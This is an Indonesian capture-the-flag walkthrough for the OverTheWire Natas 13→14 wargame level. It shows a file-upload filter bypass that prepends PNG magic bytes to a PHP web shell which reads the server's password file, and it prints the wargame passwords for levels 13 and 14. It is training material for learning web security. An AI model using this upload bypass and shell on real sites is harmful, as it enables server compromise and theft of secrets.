# Natas 13 → 14

## 🎯 Tujuan
Mendapatkan password untuk level 14 di **OverTheWire Natas**.

## 🔑 Kredensial
- Username: `natas13`
- Password: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`  # dari level 12
- URL: [http://natas13.natas.labs.overthewire.org](http://natas13.natas.labs.overthewire.org)

## 🛠️ Langkah
1. Halaman mirip level 12, tapi ada filter tambahan:
   - File harus memiliki header valid seperti **PNG**.
2. Teknik bypass:
   - Buat file dengan header PNG (`\x89PNG\r\n\x1a\n`) lalu tambahkan kode PHP setelahnya.
   - Simpan dengan ekstensi `.php` atau `.php5`.
3. Upload file ke server.
4. Akses URL upload → PHP tetap dieksekusi meski diawali header PNG.
5. Isi file:
   ```php
   \x89PNG\r\n\x1a\n
   <?php system("cat /etc/natas_webpass/natas14"); ?>
Hasil: password level 14 muncul.

<trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC>
